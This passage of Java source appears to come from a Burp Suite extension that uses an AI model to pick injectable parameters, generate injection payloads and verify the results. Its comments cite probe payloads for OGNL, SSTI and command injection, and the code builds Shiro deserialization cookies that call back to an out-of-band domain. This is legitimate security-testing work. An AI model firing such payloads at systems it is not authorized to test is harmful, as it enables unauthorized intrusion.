        byte[] response = testResponse.getResponse();
        if (response == null || response.length == 0) return;
        String marked = normalizePayloadKind(kind);
        if ("attack".equals(marked) || "bypass".equals(marked)) return;
        String key = this.comboAnchorKey(position, vulnType, requestBytes);
        if (key.isEmpty()) return;
        if (anchors.putIfAbsent(key, new ProbeAnchor(payload, response, elapsedMs, displayIndex)) == null) {
            // 这一步在提示词里，人在界面上看不见 —— 打一行「每组合一行」的日志，
            // 这是机制生效的唯一可见信号（不破坏「一条载荷一行」的节奏）
            this.logPanel.logStep(Msg.t("log.step4.control", position,
                    Msg.typeNameOf(this.formatVulnName(vulnType))));
        }
    }

    /**
     * 取本组合的对照锚点；本条载荷自己就是那条锚点时返回 null（自己不做自己的对照）。
     * 供内联与外带（延后验证）两条路径共用。
     */
    private ProbeAnchor findProbeAnchor(Map<String, ProbeAnchor> anchors, String position, String vulnType,
                                        byte[] requestBytes, int displayIndex) {
        if (anchors == null || anchors.isEmpty()) return null;
        ProbeAnchor anchor = anchors.get(this.comboAnchorKey(position, vulnType, requestBytes));
        if (anchor == null || anchor.displayIndex == displayIndex) return null;
        return anchor;
    }

    /**
     * 对照**自己**被判成漏洞时，把这个对照作废：它已经不可能是「无害参照」了。
     *
     * <p>为什么必须作废（2026-09-27 实测报告）：Struts2 的探测载荷指南第 1 条就是 {@code %{100*100}} ——
     * 而这条载荷**本身就是本类型的强证据**（代码的算术求值规则要的正是「乘积出现在响应里」），
     * 于是那个「对照」里装着一份利用成功的产物。模型拿着它当「正常业务响应」看，
     * 完全可能把后续载荷的求值结果读成「应用本来就这样」—— 方向是假阴性。
     * 同一类问题还有 SSTI（{@code {{7*7}}}）与命令注入（{@code id}/{@code whoami} 的实际输出）：
     * 11 个类型里有 3 个的探测载荷同时是证明载荷。指南措辞已同时收紧了，
     * 但那条只能约束模型的输出，**这里是兜底**：不管模型给出什么，只要对照自己判成了漏洞就作废，
     * 同组合的后续载荷退回「只与基线比对」（也就是引入对照之前的行为）。
     *
     * <p>只作废**自己**：别的载荷判成漏洞不影响对照的有效性，
     * 而本方法在每个组合里最多触发一次。
     */
    private void invalidateControlIfSelf(Map<String, ProbeAnchor> anchors, String position, String vulnType,
                                         byte[] requestBytes, int displayIndex) {
        if (anchors == null || anchors.isEmpty()) return;
        String key = this.comboAnchorKey(position, vulnType, requestBytes);
        if (key.isEmpty()) return;
        ProbeAnchor anchor = anchors.get(key);
        if (anchor == null || anchor.displayIndex != displayIndex) return;
        if (anchors.remove(key) != null) {
            this.logPanel.logStep(Msg.t("log.step4.controlVoid", position,
                    Msg.typeNameOf(this.formatVulnName(vulnType))));
        }
    }

    private static String stripHeaderPrefix(String position) {
        if (position == null) return null;
        if (position.toLowerCase().startsWith("header:")) {
            return position.substring(7).trim();
        }
        return position;
    }

    private static boolean isSensitiveParamName(String lowerName) {
        if (lowerName == null) return false;
        return lowerName.contains("csrf") || lowerName.contains("xsrf")
                || lowerName.endsWith("token")
                || lowerName.equals("timestamp") || lowerName.equals("nonce")
                || lowerName.equals("sign") || lowerName.equals("signature") || lowerName.equals("sig");
    }

    private boolean isHeaderParameter(String position) {
        if (position == null) return false;
        String lower = position.toLowerCase();
        // 只过滤真正的标准 HTTP 头，允许 Cookie 和自定义 Header（X-Forwarded-For 等）作为注入点
        return lower.equals("host") || lower.equals("content-length") ||
               lower.equals("connection") || lower.equals("upgrade") ||
               lower.equals("transfer-encoding") || lower.equals("proxy-connection") ||
               lower.equals("proxy-authorization");
    }

    private List<String> getValidParamNames(byte[] requestBytes, ScanTask task) {
        List<String> validParamNames = new ArrayList<>();
        try {
            validParamNames = injectableParamNames(this.helpers, requestBytes, true);
        } catch (Exception e) {
            this.logPanel.logError(Msg.t("log.getValidParamNamesFailed"), e);
        }
        return validParamNames;
    }

    /**
     * 「哪些参数值得测」的**唯一一份定义**：Burp 解析出的参数名，滤掉 csrf/token/timestamp 那类
     * （{@link #isSensitiveParamName}）。step2 拿它当输入，Proxy 自动扫描拿它当闸门 ——
     * 同一份谓词在两处各写一遍，迟早会漂移成两个答案（这个仓库在别处已经吃过一次）。
     *
     * <p>{@code includeCookies} 为 false 时不把 Cookie 参数算进来，理由见
     * {@link #injectableProxyParamNames}。
     */
    private static List<String> injectableParamNames(IExtensionHelpers helpers, byte[] requestBytes,
                                                     boolean includeCookies) {
        List<String> names = new ArrayList<>();
        for (IParameter param : injectableParams(helpers, requestBytes, includeCookies)) {
            names.add(param.getName());
        }
        return names;
    }

    /**
     * 过滤之后的参数（**唯一一份「哪些参数值得测」的判据**，共两个出口）：
     * 裸名字给 step2 与参数闸门（{@link #injectableParamNames}），带位置前缀给自动扫描的去重键
     * （{@link #injectableProxyParamNames}）—— 分成两份实现迟早会漂移，见 {@link #injectableProxyParamNames}。
     */
    private static List<IParameter> injectableParams(IExtensionHelpers helpers, byte[] requestBytes,
                                                     boolean includeCookies) {
        List<IParameter> kept = new ArrayList<IParameter>();
        IRequestInfo requestInfo = helpers.analyzeRequest(requestBytes);
        List<IParameter> parameters = requestInfo.getParameters();
        if (parameters == null) {
            return kept;
        }
        for (IParameter param : parameters) {
            if (param == null || param.getName() == null) continue;
            if (!includeCookies && param.getType() == IParameter.PARAM_COOKIE) continue;
            if (isSensitiveParamName(param.getName().toLowerCase())) continue;
            if (isDuplicateMultipartAttribute(requestBytes, param, parameters)) continue;
            kept.add(param);
        }
        return kept;
    }

    /**
     * 去重键里的参数形态：{@code 位置:名字}（如 {@code url:id} / {@code body:user}）。
     *
     * <p>位置也要算进来，因为「查询串的 id」与「请求体的 id」是两个不同的注入面：只看名字的话，
     * {@code POST /a?id=1} 与 {@code POST /a}（body 里 id=1）会落到同一个键上，后者被当成重复静默跳过 ——
     * 一个注入位置就此不再被自动扫描，而日志里没有任何痕迹。
     */
    private static String positionTagOf(IParameter param) {
        byte type = param.getType();
        if (type == IParameter.PARAM_URL) return "url";
        if (type == IParameter.PARAM_BODY) return "body";
        if (type == IParameter.PARAM_JSON) return "json";
        if (type == IParameter.PARAM_XML) return "xml";
        if (type == IParameter.PARAM_XML_ATTR) return "xmlattr";
        if (type == IParameter.PARAM_MULTIPART_ATTR) return "mpart";
        // 认不出的类型也要能区分开，不能一律落到同一个前缀上（那正好就是上面要防的塌缩）
        return "type" + type;
    }

    /**
     * 这个参数是不是「所属 part 已经以别的名字在参数表里」的 multipart 属性（{@code filename} / {@code name}）。
     *
     * <p>Burp 把一个文件部件报成**两个**参数：part 名（{@code name="file"} → 参数 {@code file}）和
     * {@code filename} 属性（{@code PARAM_MULTIPART_ATTR}）。它们是**同一个上传面**，两个都放进参数表
     * 的代价是实打实的：step2 会把两个都映射成注入点，step3 于是为同一个 part 各生成一份载荷 ——
     * 发包数和 AI 验证数翻倍，报告里还会出现两条只是参数名不同的同一条漏洞
     * （实测：18 个载荷里 1-9 打 {@code file}、10-18 打 {@code filename}，两条 98%/97% 的洞）。
     *
     * <p>只保留 part 名那一份：报告里显示的也是它，指南（{@link #getPayloadGuideForVulnType}）
     * 就是按「position 指向文件字段」写的，注入层对两种写法本来都认。
     *
     * <p>**安全兜底**：只有在参数表里确实存在同名的 part 参数时才丢掉属性那一份 —— 万一某个 Burp
     * 版本只报属性不报 part 名，这里不会把整个上传点丢掉（少扫一个点比多发一倍包更糟）。
     */
    private static boolean isDuplicateMultipartAttribute(byte[] requestBytes, IParameter param,
                                                         List<IParameter> all) {
        if (requestBytes == null || param.getType() != IParameter.PARAM_MULTIPART_ATTR) return false;
        String lower = param.getName().toLowerCase();
        if (!lower.equals("filename") && !lower.equals("name")) return false;
        byte[] mark = "\r\n--".getBytes(StandardCharsets.UTF_8);
        int start = lastIndexOfBytes(requestBytes, mark, param.getNameStart());
        int end = indexOfBytes(requestBytes, mark, param.getNameStart(), requestBytes.length);
        if (start < 0 || end <= start + mark.length) return false;
        String header = partHeaderText(requestBytes, start + mark.length, end);
        int at = header.indexOf("name=\"");
        if (at < 0) return false;
        int close = header.indexOf('"', at + 6);
        if (close < 0) return false;
        String partName = header.substring(at + 6, close);
        if (partName.isEmpty()) return false;
        for (IParameter other : all) {
            if (other == null || other == param || other.getName() == null) continue;
            if (other.getName().equalsIgnoreCase(partName)) return true;
        }
        return false;
    }

    /**
     * {@link #isDuplicateMultipartAttribute} 在**映射层**的对应物：把 paramVulnMap 里
     * 「与部件名重复的 filename / name 属性映射」删掉，返回被删掉的名字。
     *
     * <p>参数表那边去过重还不够 —— 模型仍会为一个上传面写两条（步骤 2 的注入点提示明说
     * 「part 名（如 file）或它的 filename 属性」），而两条映射在 {@link #isValidPosition} 的兜底
     * 判据里都是「请求里真实存在的位置」，于是双双活下来：步骤 3 为同一个上传面各生成 9 条载荷
     * （实测 18 条：1-9 打 {@code file}、10-18 打 {@code filename}），报告里出两条只是参数名不同的
     * 同源漏洞。
     *
     * <p>**拦在映射层而不是 {@link #isValidPosition} 里**：那个判据 step3 也用来验载荷位置，
     * 拦在那里会把 position 写 {@code filename} 的**载荷**一起判成非法（载荷用哪种写法是允许的，
     * {@link #mappedParamsOf} 的部件别名就是为它准备的）。重复只发生在「映射」这一层。
     *
     * <p>**安全兜底**：只有同一个上传面已经以部件名的形式映射过时才删。部件名一条都没映射时，
     * 属性写法就是唯一的上传点（某些 Burp 版本只报属性不报部件名），删了等于漏扫。
     */
    private List<String> dedupMultipartAttributeMappings(JsonArray map, byte[] requestBytes) {
        List<String> dropped = new ArrayList<String>();
        if (map == null) return dropped;
        Set<String> partNames = multipartPartNamesOf(requestBytes);
        if (partNames.isEmpty()) return dropped;
        Set<String> mappedPartNames = new HashSet<String>();
        for (JsonElement elem : map) {
            if (elem == null || !elem.isJsonObject()) continue;
            String key = normalizeParamKey(safeGetString(elem.getAsJsonObject(), "param", ""));
            if (partNames.contains(key)) {
                mappedPartNames.add(key);
            }
        }
        if (mappedPartNames.isEmpty()) return dropped;
        for (int i = map.size() - 1; i >= 0; --i) {
            JsonElement elem = map.get(i);
            if (elem == null || !elem.isJsonObject()) continue;
            String param = safeGetString(elem.getAsJsonObject(), "param", "");
            String key = normalizeParamKey(param);
            // partNames 里真有这个名字时，它就是个部件（不是属性写法），别误删
            if (!isMultipartAttrKey(key) || partNames.contains(key)) continue;
            dropped.add(param);
            map.remove(i);
        }
        return dropped;
    }

    private static int lastIndexOfBytes(byte[] haystack, byte[] needle, int from) {
        if (needle.length == 0) return -1;
        for (int i = Math.min(from, haystack.length - needle.length); i >= 0; --i) {
            boolean hit = true;
            for (int j = 0; j < needle.length; ++j) {
                if (haystack[i + j] != needle[j]) { hit = false; break; }
            }
            if (hit) return i;
        }
        return -1;
    }

    /**
     * 这条请求里可注入的参数名 —— Proxy 自动扫描的**参数闸门与去重键共用这一份定义**
     * （与 step2 用的是同一个 {@link #injectableParamNames}，只是那时 {@code includeCookies=true}）。
     *
     * <p><b>闸门</b>：没有参数的流量（图片/CSS/JS/favicon、纯 REST 路径）不该各建一条任务 ——
     * 那些任务跑到底也是「AI 未发现值得测试的参数 → 安全」，白搭一次重放请求和一次 AI 调用，
     * 任务列表还被刷屏。
     *
     * <p><b>去重键</b>：自动扫描按**参数名**判重、参数值不参与（{@link ProxyScanHistory#key}）。
     * 两边必须是同一份答案：闸门认了、键里却没有这个参数名，就会出现两条任务只是值不同的重复扫描；
     * 反过来就是漏扫。所以这里不给「闸门版」和「键版」各写一份。
     *
     * <p><b>Cookie 不算参数</b>：Burp 把每个 cookie 都当参数（{@code PARAM_COOKIE}），可带着会话
     * cookie 的图片/CSS 于是也成了「有参数」—— 登录状态下这个闸门就等于没装。代价是「只有 Cookie
     * 可注入」的请求（Shiro 的 rememberMe 那种）不再被自动扫描扫到，要手工右键。
     * 扫描本身不受影响：{@link #getValidParamNames} 仍然带 Cookie（{@link #mappedParamsOf} 的
     * Cookie 家族别名就是为它准备的），只是自动扫描这个入口不再靠它建任务。
     *
     * <p>同理，只有自定义请求头（{@code X-Forwarded-For}）或只有 REST 路径段可注入的请求也会被挡掉 ——
     * 那种请求对任何「有参数吗」的判定都是无参数的（每个请求都有请求头，算上就等于不过滤）。
     *
     * @return 参数形态 {@code 位置:名字}（空表 = 没有可注入参数，不建任务）；**解析不了时返回
     *         {@code null}**，调用方按「放行」处理 —— 这个闸门是静默的，宁可多建一条会把失败原因
     *         打在日志里的任务，也不要因为一次解析异常无声地漏掉流量（此时去重也退回按请求体哈希
     *         判重，宁多扫不漏扫）
     */
    public static List<String> injectableProxyParamNames(IExtensionHelpers helpers, byte[] requestBytes) {
        if (helpers == null || requestBytes == null || requestBytes.length == 0) {
            return new ArrayList<String>();
        }
        try {
            List<String> keys = new ArrayList<String>();
            for (IParameter param : injectableParams(helpers, requestBytes, false)) {
                keys.add(positionTagOf(param) + ":" + param.getName());
            }
            return keys;
        } catch (Exception e) {
            return null;
        }
    }

    private static boolean isJsonContentType(String contentType) {
        if (contentType == null) return false;
        String lower = contentType.toLowerCase();
        return lower.contains("application/json") || lower.contains("text/json") || lower.contains("+json");
    }

    private static boolean isXmlContentType(String contentType) {
        if (contentType == null) return false;
        String lower = contentType.toLowerCase();
        return lower.contains("text/xml") || lower.contains("application/xml")
                || lower.contains("+xml");
    }

    private static boolean isMultipartContentType(String contentType) {
        return contentType != null && contentType.toLowerCase().contains("multipart/form-data");
    }

    public AIEngine(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, LogPanel logPanel, VulnDiscoveryListener listener) {
        this.callbacks = callbacks;
        this.helpers = helpers;
        this.logPanel = logPanel;
        this.vulnListener = listener;
        this.gson = new Gson();
        this.httpClient = new OkHttpClient.Builder().connectTimeout(30L, TimeUnit.SECONDS).writeTimeout(30L, TimeUnit.SECONDS).readTimeout(120L, TimeUnit.SECONDS).build();
    }

    public void scanRequest(ScanTask task) {
        // 已删除（= 已取消）的任务不再开工。提交进池子的任务先排队，而池子只有 10 条线程：
        // 等轮到它时，step1 重放 + step2/step3 两次 AI 调用都白花（几秒到几分钟）。
        // 载荷循环里那道取消检查（见下面 while 暂停等待）要到 step3 之后才第一次生效，
        // 所以「排队中删掉的任务仍照跑一遍」在日志里看起来就是「任务都删了还在打 AI」。
        if (task.isCancelled()) {
            task.setAiTag("已取消");
            return;
        }
        // 外带验证的调度器：一个扫描一个（单线程），只有真的排了外带验证才会起线程。
        // 任务收尾时统一等待并关闭，见 awaitOobVerifications / 下面 finally。
        ScheduledExecutorService oobScheduler = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "ZackAI-OOB-Verify-" + task.getId());
            t.setDaemon(true);
            return t;
        });
        // 只有扫描线程会往这个列表里加（收尾等待也在扫描线程上跑），普通列表即可
        List<Future<?>> oobFutures = new ArrayList<Future<?>>();
        try {
            this.logPanel.logDivider(DIVIDER);
            this.logPanel.logStep(Msg.t("log.taskHeader", task.getId(), task.getMethod() + " " + task.getUrl()));
            this.logPanel.logDivider(DIVIDER);
            task.clearProbeRecords();
            task.setStatus(ScanTask.TaskStatus.SCANNING);
            task.setAiTag("分析中");
            
            ScanTask.ScanMode mode = task.getScanMode();
            String scanModeStr = (mode != null && !mode.isCustom()) ? mode.getDisplayName() : "AI智能扫描";
            
            String requestInfo = null;
            List<String> validParamNames = null;

            // 外带回连检测：域名在插件加载时已申请，Burp 存活期间所有任务共用这一个
            // （`OASTClient.shared().ensureSession()`，加载时失败的话这里会重试）。
            // 每个 OOB 请求包再各自带一个随机前缀，见下面载荷循环。服务不可用时 oastHost 为 null，
            // 此时不生成外带类载荷。
            // 配置里关掉外带回连时**连域名都不申请**：不产生任何到回连服务的流量，
            // 载荷循环也会把带外带域名的载荷整条跳过（见 shouldSkipOobPayload）。
            boolean oobEnabled = isOobEnabled();
            OASTClient oast = oobEnabled ? OASTClient.shared() : null;
            OASTClient.Session oastSession = oobEnabled ? oast.ensureSession() : null;
            String oastHost = oastSession != null ? oastSession.getDomain() : null;
            task.setOastHost(oastHost);
            if (oobEnabled) {
                this.logOastDomain(oastHost, oast.getLastError());
            } else {
                this.logPanel.logInfo(Msg.t("log.oobOffThisScan"));
            }

            this.logPanel.logStep(Msg.t("log.step1.sending"));
            long step1Start = System.currentTimeMillis();
            
            // 重放也要限时（与步骤4 的载荷同一个上限，见 replayWithTimeout）：
            // 以前这一步是裸调 makeHttpRequest，目标不响应时会一直卡到 Burp 自己的超时（分钟级），
            // 日志上只有「正在发送原始请求到目标...」，任务看着像死了
            IHttpRequestResponse originalWithResponse = this.replayWithTimeout(
                    task.getOriginalRequest().getHttpService(),
                    task.getOriginalRequest().getRequest(),
                    TEST_REQUEST_TIMEOUT_SECONDS * 1000L);
            // 记录基线耗时：验证阶段要靠「本次耗时 vs 基线」判断时间盲注，
            // 只看绝对值无法区分「本来就慢的接口」和「被 SLEEP 拖慢的接口」
            task.setOriginalResponseMillis(originalWithResponse == null ? -1L : System.currentTimeMillis() - step1Start);

            if (originalWithResponse != null && originalWithResponse.getResponse() != null) {
                task.setOriginalResponseBytes(originalWithResponse.getResponse());
                this.logPanel.logStep(Msg.t("log.step1.gotResponse", originalWithResponse.getResponse().length));
            } else {
                this.logPanel.logWarning(Msg.t("log.step1.noResponse"));
                this.logPanel.logStep(Msg.t("log.step1.sentNoResponse"));
            }

            // makeHttpRequest 返回 null（Burp 在目标不可达/被拦截时会给 null）时，
            // 后面所有取 request 的地方都没得取 —— 早退并把原因写在标签上。
            // 以前这里继续往下走，第一处解引用就 NPE，任务被兜底 catch 成「异常」，
            // 用户看到的是异常堆栈而不是「目标没响应」。
            if (originalWithResponse == null) {
                task.setStatus(ScanTask.TaskStatus.FINISHED);
                task.setVulnLevel(ScanTask.VulnLevel.NONE);
                task.setAiTag("无响应");
                task.setErrorMessage(Msg.t("err.targetNoResponse"));
                this.logPanel.logWarning(Msg.t("log.step1.nullResponse"));
                this.logPanel.logDivider(DIVIDER);
                return;
            }

            requestInfo = this.buildRequestInfo(originalWithResponse, true);

            // 本次分析用的请求字节：buildRequestInfo 与 getValidParamNames 都取自它，
            // 位置是否合法的判定（isValidPosition 的兜底分支）也必须用同一份 —— 三处不能各取各的
            byte[] scannedRequestBytes = originalWithResponse.getRequest();
            validParamNames = this.getValidParamNames(scannedRequestBytes, task);
            // 「测试参数」**不在这里写**：validParamNames 只是 Burp 报上来的**候选**参数，此刻 AI 还没
            // 分析过。以前在这里落笔，报告里就会列出整个候选列表（username, password, token…），
            // 而实际只测了其中一两个 —— 日志里在打 username、报告里却列着一串，两边对不上，
            // 读报告的人会以为每个参数都发过包。真正测过的位置在下面的载荷循环里收集。

            this.logPanel.logDivider(DIVIDER);
            this.logPanel.logStep(Msg.t("log.step2.analyzing"));
            JsonObject paramVulnMapResult = this.step2AnalyzeParamVulnMapping(task, requestInfo, validParamNames, scannedRequestBytes);
            if (paramVulnMapResult == null) {
                task.setStatus(ScanTask.TaskStatus.FINISHED);
                task.setAiTag("分析失败");
                return;
            }
            
            String analysisText = this.safeGetString(paramVulnMapResult, "analysis", Msg.t("log.step2.analysisDefault"));
            this.logPanel.logAI(Msg.t("log.step2.done", analysisText));
            
            JsonArray paramVulnMapForDisplay = paramVulnMapResult.has("paramVulnMap") ? paramVulnMapResult.getAsJsonArray("paramVulnMap") : null;
            StringBuilder paramVulnDisplay = new StringBuilder();
            if (paramVulnMapForDisplay != null && paramVulnMapForDisplay.size() > 0) {
                for (int i = 0; i < paramVulnMapForDisplay.size(); i++) {
                    JsonElement elem = paramVulnMapForDisplay.get(i);
                    if (elem.isJsonObject()) {
                        JsonObject mapping = elem.getAsJsonObject();
                        String p = safeGetString(mapping, "param", "");
                        JsonArray vulnTypes = mapping.has("vulnTypes") ? mapping.getAsJsonArray("vulnTypes") : null;
                        if (vulnTypes != null && vulnTypes.size() > 0) {
                            List<String> typeList = new ArrayList<>();
                            for (JsonElement vt : vulnTypes) {
                                typeList.add(vt.getAsString());
                            }
                            if (paramVulnDisplay.length() > 0) paramVulnDisplay.append(", ");
                            paramVulnDisplay.append(p).append(" [").append(String.join(", ", typeList)).append("]");
                        }
                    }
                }
            }
            
            // 一条「参数-漏洞」组合都没有 → 这次不发任何 PoC。
            // 这就是「只对可能存在漏洞的参数发 PoC」的落地：AI 没点名的参数一个包都不发。
            if (paramVulnDisplay.length() == 0) {
                this.logPanel.logWarning(Msg.t("log.step2.noParams"));
                this.logPanel.logDivider(DIVIDER);
                task.setStatus(ScanTask.TaskStatus.FINISHED);
                task.setVulnLevel(ScanTask.VulnLevel.NONE);
                task.setAiTag("安全");
                return;
            }

            // 本次要判的类型：Step3 只给这些类型发指南，验证阶段也只发这些类型的特征块
            Set<String> mappedTypes = this.mappedTypesOf(paramVulnMapResult);
            task.setMappedVulnTypes(mappedTypes);
            if (!mappedTypes.isEmpty() && mappedTypes.size() < VULN_TYPE_COUNT) {
                this.logPanel.logStep(Msg.t("log.step3.types", String.join(Msg.t("sep.list"), mappedTypes)));
            }

            this.logPanel.logDivider(DIVIDER);
            this.logPanel.logAI(Msg.t("log.step3.generating"));
            if (paramVulnDisplay.length() > 0) {
                this.logPanel.logAI(Msg.t("log.step3.params", paramVulnDisplay.toString()));
            }
            PayloadResult payloadResult = this.step3GeneratePayloads(task, requestInfo, paramVulnMapResult, validParamNames, scannedRequestBytes);
            if (payloadResult == null) {
                // 「AI 调用/解析失败」和「模型明确说没有可测的组合」是两回事：
                // 前者一个包都没发，记成「安全」会让用户以为目标没问题（已重试过一次，仍是失败）
                this.logPanel.logError(Msg.t("log.step3.genFailed"));
                this.logPanel.logDivider(DIVIDER);
                task.setStatus(ScanTask.TaskStatus.FINISHED);
                task.setVulnLevel(ScanTask.VulnLevel.NONE);
                task.setAiTag("分析失败");
                return;
            }
            // 这两个数**先打**：它们是「模型没给载荷」与「模型给了但我们全丢了」的区别，而后者
            // 恰恰是最容易让人误以为「这类漏洞扫不了」的情况（实测：Shiro 靶场里 position 的写法
            // 与映射对不上，一整轮载荷被静默丢光，日志里只有一句「未生成有效 payload」）。
            int rawCount = payloadResult.rawCount;
            int filteredCount = payloadResult.payloads.size();
            this.logPanel.logAI(Msg.t("log.step3.rawCount", rawCount));
            if (payloadResult.unmappedCount > 0) {
                this.logPanel.logWarning(Msg.t("log.step3.dropped", payloadResult.unmappedCount));
            }
            if (payloadResult.payloads == null || payloadResult.payloads.size() == 0) {
                // 模型确实返回了、但一条载荷都没有（或全被过滤）——这才是「没东西可测」
                this.logPanel.logWarning(Msg.t("log.step3.noPayload"));
                this.logPanel.logDivider(DIVIDER);
                task.setStatus(ScanTask.TaskStatus.FINISHED);
                task.setVulnLevel(ScanTask.VulnLevel.NONE);
                task.setAiTag("安全");
                return;
            }
            this.logPanel.logAI(Msg.t("log.step3.filtered", filteredCount));
            this.logPanel.logDivider(DIVIDER);
            JsonArray filteredPayloads = payloadResult.payloads;
            
            task.setAiTag("渗透测试中");
            int testCount = 0;
            // 收尾摘要用的计数：跳过的载荷（注不进去/发送失败）与「无差异跳过验证」的条数
            final java.util.concurrent.atomic.AtomicInteger skippedPayloads = new java.util.concurrent.atomic.AtomicInteger();
            final java.util.concurrent.atomic.AtomicInteger noDiffSkips = new java.util.concurrent.atomic.AtomicInteger();
            // 「发出去了但没拿到响应」的条数（超时 / Burp 返回 null / 发送异常）：它们也占「发包 N」，
            // 却拿不到任何判定 —— 摘要里单列出来，用户才知道 N 里头有几条是白打的
            final java.util.concurrent.atomic.AtomicInteger noResponsePayloads = new java.util.concurrent.atomic.AtomicInteger();
            // 每个「参数 × 类型」组合的对照锚点（该组合第一条载荷的响应）。写的是扫描线程，
            // 读的有两条路径：内联验证（同线程）与延后外带验证（oobScheduler 线程，5 秒后）——
            // 所以必须是并发容器。见 recordProbeAnchor / findProbeAnchor。
            final Map<String, ProbeAnchor> probeAnchors = new java.util.concurrent.ConcurrentHashMap<String, ProbeAnchor>();
            final long scanStartMillis = System.currentTimeMillis();
            Set<String> allTestedParams = new HashSet<>();
            for (String pname : validParamNames) {
                allTestedParams.add(pname.toLowerCase());
            }
            // 真正发过载荷的位置：归一化键 → 原始写法。报告里的「测试参数」就用它（显示原始写法，
            // 与 [步骤4] 日志行里的位置逐字一致）；用 Map 而不是 List 是因为同一个位置会被多条载荷
            // 命中，而报告里只该出现一次。归一化键同时给下面的「未覆盖参数」对比用。
            Map<String, String> testedPositions = new LinkedHashMap<>();
            for (int i = 0; i < filteredPayloads.size(); ++i) {
                // 暂停等待必须能被取消打断：取消（「删除任务」）会置 isCancelled，
                // 而 UI 里任务一旦变成已结束就再也点不了「继续扫描」——
                // 只等 isPaused 的话线程会永久卡在这里，池子线程被一个个耗光
                while (task.isPaused() && !task.isCancelled()) {
                    try {
                        Thread.sleep(500);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
                if (task.isCancelled() || task.getStatus() != ScanTask.TaskStatus.SCANNING) {
                    task.setAiTag("已取消");
                    return;
                }
                JsonObject payload = filteredPayloads.get(i).getAsJsonObject();
                if (!payload.has("type") || !payload.has("payload")) {
                    continue;
                }
                String vulnType = this.safeGetString(payload, "type", "UNKNOWN");
                String testData = this.safeGetString(payload, "payload", "");
                String position = this.safeGetString(payload, "position", null);
                // 载荷是不是探测载荷：只用来**否决**（明确写了 attack/bypass 的不当对照），
                // 识别对照本身靠顺序 —— 契约规定每个组合的第 1 条就是探测载荷
                String payloadKind = this.safeGetString(payload, "kind", null);
                if (testData.isEmpty() || position == null || position.equals("auto")) {
                    continue;
                }
                // 外带回连关闭时，带外带域名的载荷**一条都不发**：发出去等于让被扫目标去访问一个
                // 我们不会去查的域名（既拿不到证据，也白白把流量引向第三方）
                if (shouldSkipOobPayload(testData, oobEnabled, oastHost)) {
                    skippedPayloads.incrementAndGet();
                    this.logPanel.logStep(Msg.t("log.step4.skipOob", i + 1, filteredPayloads.size(), position));
                    continue;
                }
                // 外带载荷：发送前把回连域名（含本次请求的随机前缀）写进载荷 —— 模型漏改占位符、
                // 或自己抄了个重复标签时都在这里纠正，否则载荷解析的域名永远不会回连，
                // 而验证阶段会把「无记录」当成「目标没有外带行为」的反向证据
                OobProbe oob = null;
                boolean shiroMarker = ShiroPayload.hasMarker(testData);
                if (shiroMarker || OASTClient.isOobPayload(testData, oastHost)) {
                    oob = new OobProbe();
                    if (oastHost == null) {
                        oob.failure = "本次未取得回连域名（回连服务不可用）";
                    } else {
                        oob.label = OASTClient.randomLabel();
                        oob.domain = oastHost;
                        if (shiroMarker) {
                            // Shiro 载荷是 AES+序列化的 cookie 值，模型只给密钥标记，这里生成
                            testData = ShiroPayload.expand(testData, oob.label + "." + oastHost);
                            if (ShiroPayload.hasMarker(testData)) {
                                this.logPanel.logWarning(Msg.t("log.shiro.markerFailed"));
                            }
                        } else {
                            testData = OASTClient.applyCallbackHost(testData, oastHost, oob.label);
                        }
                    }
                }
                // 一条载荷只占一行：外带前缀直接写进这一行（原来「已发出，约 5 秒后查回连记录」
                // 还单独占一行，纯外带模式下等于每载荷多一行），验证结论也由这一行之后的结论行表达。
                // 编号统一用「本条在本次载荷列表里的序号 i+1」（发送行、结论行、外带回连行、探针记录全用它）——
                // 以前结论行用的是「已发送计数 +1」，跳过一条之后同一条载荷两行编号就对不上。
                int displayIndex = i + 1;
                this.logPanel.logPayload(Msg.t("log.step4.payload", displayIndex, filteredPayloads.size(),
                        Msg.typeNameOf(formatVulnName(vulnType)), position, loggablePayload(testData),
                        oob != null && oob.failure == null ? Msg.t("log.oobPrefix", oob.label) : ""));
                TestSendResult sendResult = this.sendTestRequest(task.getOriginalRequest(), testData, position);
                if (sendResult == null) {
                    skippedPayloads.incrementAndGet();
                    continue;
                }
                // 发出去了就算发包：超时/无响应也算（包确实出去了），跳过只统计「压根没发出去」的
                ++testCount;
                IHttpRequestResponse testResponse = sendResult.response;
                // 对照锚点**在这里记**（而不是等 processTestResult）：这条载荷很可能正是会被
                // 「与基线无差异即无漏洞」跳过的那一条，进了 processTestResult 就丢字节了；
                // 外带载荷的 processTestResult 还是 5 秒后在调度线程上跑的，在那里记会和发送顺序错位
                this.recordProbeAnchor(probeAnchors, position, vulnType, scannedRequestBytes,
                        testData, testResponse, sendResult.elapsedMs, displayIndex, payloadKind);
                String positionKey = normalizeParamKey(position);
                if (testedPositions.putIfAbsent(positionKey, position) == null) {
                    // 就地更新报告字段：扫描中途导出也能看到「到目前为止测了哪些」，
                    // 而不用等循环结束（取消路径也就不需要额外补一次）
                    task.setTestParams(String.join(", ", testedPositions.values()));
                }
                // 探针记录**无条件先记**：只要包发出去了，详情面板里就必须看得到它（哪怕没有响应）。
                // 超时那条尤其重要 —— 用户要能对着发出去的包判断是目标挂了还是被拦了
                task.addProbeRecord(new ScanTask.ProbeRecord(displayIndex, vulnType, testData, position, testResponse));
                if (testResponse.getResponse() == null && !(oob != null && oob.failure == null)) {
                    // 没有响应体、也没有回连通道可等 → 这条载荷注定是「未判定」。
                    // 计数单列一格：摘要里「发包 N」包含它，但用户要能看出 N 里头有几条没被判定
                    noResponsePayloads.incrementAndGet();
                }
                if (oob != null && oob.failure == null) {
                    // 外带载荷：不在这里等那 5 秒，直接排一个延后任务（到点查回连 → 交给 AI 验证），
                    // 扫描线程立刻回去发下一条。等待时间与后续载荷的发送重叠，整体快一大截。
                    // 归属仍然只认「最左侧标签等于本次随机前缀」的记录，并发/先后都不会串味。
                    PendingOobVerify pending = new PendingOobVerify(task, testResponse,
                            filteredPayloads.size(), vulnType, testData, position, sendResult.elapsedMs, oob, displayIndex,
                            noDiffSkips, probeAnchors, scannedRequestBytes);
                    oobFutures.add(oobScheduler.schedule(
                            () -> this.runPendingOobVerify(pending, oast, oastSession),
                            OOB_POLL_DELAY_SECONDS, TimeUnit.SECONDS));
                } else {
